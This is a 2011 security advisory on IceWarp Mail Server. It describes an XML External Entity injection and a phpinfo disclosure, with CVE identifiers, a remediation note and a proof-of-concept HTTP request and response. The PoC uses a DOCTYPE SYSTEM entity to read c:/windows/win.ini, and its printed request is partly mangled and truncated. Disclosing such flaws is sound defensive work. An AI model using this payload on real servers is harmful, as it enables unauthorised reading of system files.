Trustwave's SpiderLabs Security Advisory TWSL2011-013:
Multiple Vulnerabilities in IceWarp Mail Server
https://www.trustwave.com/spiderlabs/advisories/TWSL2011-013.txt
Published: 2011-09-23
Version: 1.0
Vendor: IceWarp (http://www.icewarp.com)
Product: IceWarp Mail Server
Version affected: 10.3.2 and below
Product description: IceWarp WebMail is the web front-end for the IceWarp
Mail Server, which provides email access on over 50,000 servers. IceWarp
WebMail provides web-based access to email, calendars, contacts, files
and shared data from any computer with a browser and Internet connection.

Finding 1: XML External Entity Injection
CVE: CVE-2011-3579
An external entity is a function of the XML specification which allows XML
documents to reference resources external to the XML document. This
functionality forces the XML parser of the application to access the
resource specified.
In this case it is possible to inject an XML DOCTYPE "SYSTEM" directive to
access local files on the operating system where the IceWarp server is
installed. Using this technique it is possible to retrieve readable files
on the operating system. This attack can also be used to create a possible
denial of service condition.
Proof-of-Concept:
The following POST request was sent to the host A.B.C.D where the IceWarp
mail server was running:
REQUEST
=========
POST /-..\_.\_.--..\_1243848280/server/webmail.php HTTP/1.1
Host:A.B.C.D User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0)

Accept-Language:en-gb,en;q=0.5i've
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,\*;q=0.7
Proxy-Connection: keep-alive

Content-Type: application/xml;charset=UTF-8
Pragma: no-cache
Cache-Control: no-cache
<!DOCTYPE foo [<!ENTITY xxeb91c4 SYSTEM "file:///c:/windows/win.ini"> ]><iq

d2bdb221e15bf2baa4acefe38f264d92d152878ca4d33</digest><method>RSA</method><
/query></iq>
RESPONSE:
==========
HTTP/1.1 200 OK
Server: IceWarp/9.4.2
Date: Wed, 20 Jul 2011 10:04:56 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control:no-store, no-cache, must-revalidate, post-check=0,
pre-check=0 Pragma: no-cache
Content-Type: text/xml
Vary: Accept-Encoding
Content-Length: 1113
<?xml version="1.0" encoding="utf-8"?><iq type="error"><error

MAPI=1
....TRUNCATED
The above proof-of-concept would retrieve the c:\windows\win.ini file (the
response in this example has been truncated).
Finding 2: PHP Information Disclosure
CVE: CVE-2011-3580
It is possible to retrieve the PHP information file phpinfo() by accessing
the following URL http://A.B.C.D/server where A.B.C.D is the IP of the
server running the IceWarp software. The response will be a page detailing
the PHP version used and the configuration settings of PHP, including
system details.
Vendor Response: These issues have been addressed as of version 10.3.3
Remediation Steps: Customers should update to the latest version of IceWarp
Mail Server in order to address these issues. The above issues have been
corrected in version 10.3.3.
